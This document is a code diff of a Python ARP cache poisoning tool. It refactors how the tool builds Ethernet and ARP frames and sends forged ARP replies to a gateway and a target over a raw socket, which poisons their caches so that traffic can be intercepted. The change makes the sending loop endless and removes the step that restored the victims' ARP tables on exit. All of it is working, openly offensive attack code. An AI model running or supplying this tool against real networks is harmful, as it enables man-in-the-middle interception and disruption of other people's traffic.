@@ -7,58 +7,79 @@ __author__ = 'EONRaider @ keybase.io/eonraider'
 A low-level ARP Cache Poisoning (a.k.a "ARP Spoofing") tool.
 """
 
+import abc
 import argparse
 import re
 import time
-from itertools import count
+from functools import partial
 from socket import htons, inet_aton, ntohs, socket, PF_PACKET, SOCK_RAW
+from struct import pack
 
 
-i = ' ' * 4  # Basic indentation level
+class Protocol(abc.ABC):
+    @staticmethod
+    def hardware_to_hex(mac):
+        return b''.join(bytes.fromhex(octet) for octet in re.split('[:-]', mac))
+
+    @abc.abstractmethod
+    def payload(self):
+        pass
 
 
-def hardware_to_hex(mac):
-    return b''.join(bytes.fromhex(octet) for octet in re.split('[:-]', mac))
-
-
-class EthernetFrame(object):
+class EthernetFrame(Protocol):  # IEEE 802.3 standard
     def __init__(self, dest_hdwr: str, source_hdwr: str, ethertype: bytes):
         self.dest_hdwr = dest_hdwr
         self.source_hdwr = source_hdwr
         self.ethertype = ethertype
-        self.bytes_dest_hdwr = hardware_to_hex(self.dest_hdwr)
-        self.bytes_source_hdwr = hardware_to_hex(self.source_hdwr)
+        self.__set_hdwr_addrs_as_bytes()
+
+    def __set_hdwr_addrs_as_bytes(self):
+        self.bytes_dest_hdwr, self.bytes_source_hdwr = \
+            (self.hardware_to_hex(addr) for addr in
+             (self.dest_hdwr, self.source_hdwr))
 
     @property
-    def payload(self):  # Defined by IEEE 802.3
+    def payload(self):
         return self.bytes_dest_hdwr + self.bytes_source_hdwr + self.ethertype
 
 
-class ARPPacket(object):
+class ARPPacket(Protocol):  # IETF RFC 826
     def __init__(self, sender_hdwr: str, sender_proto: str,
                  target_hdwr: str, target_proto: str,
-                 htype: bytes = b'\x00\x01',  # Ethernet
-                 ptype: bytes = b'\x08\x00',  # IP
-                 hlen: bytes = b'\x06',
-                 plen: bytes = b'\x04',
-                 oper: bytes = b'\x00\x02'):  # ARP REPLY message
+                 htype: int = 1, ptype: int = 0x0800,
+                 hlen: int = 6, plen: int = 4, oper: int = 2):
         self.sender_hdwr = sender_hdwr
-        self.bytes_sender_hdwr = hardware_to_hex(self.sender_hdwr)
         self.sender_proto = sender_proto
-        self.bytes_sender_proto = inet_aton(self.sender_proto)
         self.target_hdwr = target_hdwr
-        self.bytes_target_hdwr = hardware_to_hex(self.target_hdwr)
         self.target_proto = target_proto
-        self.bytes_target_proto = inet_aton(self.target_proto)
         self.htype = htype
         self.ptype = ptype
         self.hlen = hlen
         self.plen = plen
         self.oper = oper
+        self.__set_hdwr_addrs_as_bytes()
+        self.__set_proto_addrs_as_bytes()
+        self.__set_header_as_bytes()
+
+    def __set_hdwr_addrs_as_bytes(self):
+        self.bytes_sender_hdwr, self.bytes_target_hdwr = \
+            (self.hardware_to_hex(addr) for addr
+             in (self.sender_hdwr, self.target_hdwr))
+
+    def __set_proto_addrs_as_bytes(self):
+        self.bytes_sender_proto, self.bytes_target_proto = \
+            (inet_aton(addr) for addr in (self.sender_proto, self.target_proto))
+
+    def __set_header_as_bytes(self):
+        self.bytes_htype, self.bytes_ptype, self.bytes_oper = \
+            (pack('!H', field) for field in (self.htype, self.ptype, self.oper))
+        self.bytes_hlen, self.bytes_plen = \
+            (pack('B', field) for field in (self.hlen, self.plen))
 
     @property
-    def payload(self):  # Defined by IETF RFC 826
-        return self.htype + self.ptype + self.hlen + self.plen + self.oper \
+    def payload(self):
+        return self.bytes_htype + self.bytes_ptype + self.bytes_hlen \
+               + self.bytes_plen + self.bytes_oper \
                + self.bytes_sender_hdwr + self.bytes_sender_proto \
                + self.bytes_target_hdwr + self.bytes_target_proto
 
@@ -66,61 +87,48 @@ class ARPPacket(object):
 class AttackPackets(object):
     def __init__(self, attacker_mac: str, gateway_mac: str, gateway_ip: str,
                  target_mac: str, target_ip: str):
-        self.ethertype: bytes = b'\x08\x06'  # ARP EtherType code
-        self.restore_tables: bool = False
         self.attacker_mac = attacker_mac
         self.gateway_mac = gateway_mac
         self.gateway_ip = gateway_ip
         self.target_mac = target_mac
         self.target_ip = target_ip
-        self.packet_to_gateway = self.gateway_packet
-        self.packet_to_target = self.target_packet
+        self.__get_payloads()
 
     def __iter__(self):
-        yield from (self.packet_to_gateway, self.packet_to_target)
+        yield from (self.payload_to_gateway, self.payload_to_target)
 
-    @property
-    def gateway_packet(self):
-        source_mac_addr = self.attacker_mac if self.restore_tables is False \
-            else self.target_mac
-        eth_to_gateway = EthernetFrame(dest_hdwr=self.gateway_mac,
-                                       source_hdwr=self.attacker_mac,
-                                       ethertype=self.ethertype)
-        arp_to_gateway = ARPPacket(source_mac_addr, self.target_ip,
-                                   self.gateway_mac, self.gateway_ip)
-        return eth_to_gateway.payload + arp_to_gateway.payload
+    def __get_payloads(self):
+        self.__build_eth_frames()
+        self.__build_arp_packets()
+        self.payload_to_gateway = self.eth_frame_to_gateway.payload \
+                                  + self.arp_pkt_to_gateway.payload
+        self.payload_to_target = self.eth_frame_to_target.payload \
+                                 + self.arp_pkt_to_target.payload
 
-    @property
-    def target_packet(self):
-        source_mac_addr = self.attacker_mac if self.restore_tables is False \
-            else self.gateway_mac
-        eth_to_target = EthernetFrame(dest_hdwr=self.target_mac,
-                                      source_hdwr=self.attacker_mac,
-                                      ethertype=self.ethertype)
-        arp_to_target = ARPPacket(source_mac_addr, self.gateway_ip,
-                                  self.target_mac, self.target_ip)
-        return eth_to_target.payload + arp_to_target.payload
+    def __build_eth_frames(self):
+        eth_frame = partial(EthernetFrame, source_hdwr=self.attacker_mac,
+                            ethertype=b'\x08\x06')
+        self.eth_frame_to_gateway = eth_frame(dest_hdwr=self.gateway_mac)
+        self.eth_frame_to_target = eth_frame(dest_hdwr=self.target_mac)
 
-    def restore_arp_tables(self, option: bool = True):
-        self.restore_tables: bool = option
-        self.packet_to_gateway = self.gateway_packet
-        self.packet_to_target = self.target_packet
+    def __build_arp_packets(self):
+        self.arp_pkt_to_gateway = ARPPacket(self.attacker_mac, self.target_ip,
+                                            self.gateway_mac, self.gateway_ip)
+        self.arp_pkt_to_target = ARPPacket(self.attacker_mac, self.gateway_ip,
+                                           self.target_mac, self.target_ip)
 
 
 class Spoofer(object):
-    def __init__(self, interface: str, *, spoofed_packets):
+    def __init__(self, interface: str):
         self.interface = interface
-        self.spoofed_packets = spoofed_packets
 
-    def execute(self, *, max_packets: int, interval: float):
+    def execute(self, spoofed_packets):
         with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
             sock.bind((self.interface, htons(0x0800)))
-            for packet_count in count(start=1):
-                for packet in self.spoofed_packets:
+            while True:
+                for packet in spoofed_packets:
                     sock.send(packet)
-                time.sleep(interval)
-                if packet_count == max_packets:
-                    break
+                time.sleep(0.5)
 
 
 def spoof(args):
@@ -128,20 +136,12 @@ def spoof(args):
     packets = AttackPackets(attacker_mac=args.attackermac,
                             gateway_mac=args.gatemac, gateway_ip=args.gateip,
                             target_mac=args.targetmac, target_ip=args.targetip)
-    spoofer = Spoofer(interface=args.interface, spoofed_packets=packets)
-
-    current_time = time.strftime("%H:%M:%S", time.localtime())
-    print('[+] ARP Spoofing attack initiated at {0}. Press Ctrl-C to '
-          'abort.'.format(current_time))
+    spoofer = Spoofer(interface=args.interface)
+    print('[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.')
     try:
-        spoofer.execute(max_packets=args.maxpackets, interval=args.interval)
+        spoofer.execute(packets)
     except KeyboardInterrupt:
-        print('[!] Aborting ARP Spoofing attack...')
-        print('{0}[+] Attempting to restore target ARP tables to their '
-              'previous states...'.format(i))
-        packets.restore_arp_tables()
-        spoofer.execute(max_packets=20, interval=1)
-        raise SystemExit('{0}[+] ARP Spoofing attack terminated.'.format(i))
+        raise SystemExit('[!] ARP Spoofing attack terminated.')
 
 
 if __name__ == '__main__':
@@ -163,14 +163,5 @@ if __name__ == '__main__':
                         help='IP address currently assigned to the gateway.')
     parser.add_argument('--targetip', type=str, required=True, metavar='IP',
                         help='IP address currently assigned to the target.')
-    parser.add_argument('--interval', type=float, default=0.5,
-                        metavar='SECONDS',
-                        help='Time to wait between transmission of each set of '
-                             'ARP Cache Poisoning attack packets (set to 0.5 '
-                             'seconds by default).')
-    parser.add_argument('--maxpackets', type=int, default=0, metavar='PACKETS',
-                        help='Maximum number of packets to transmit to the '
-                             'targets during the attack (set to 0 to send an '
-                             'infinite number of packets by default).')
     cli_args = parser.parse_args()
     spoof(cli_args)
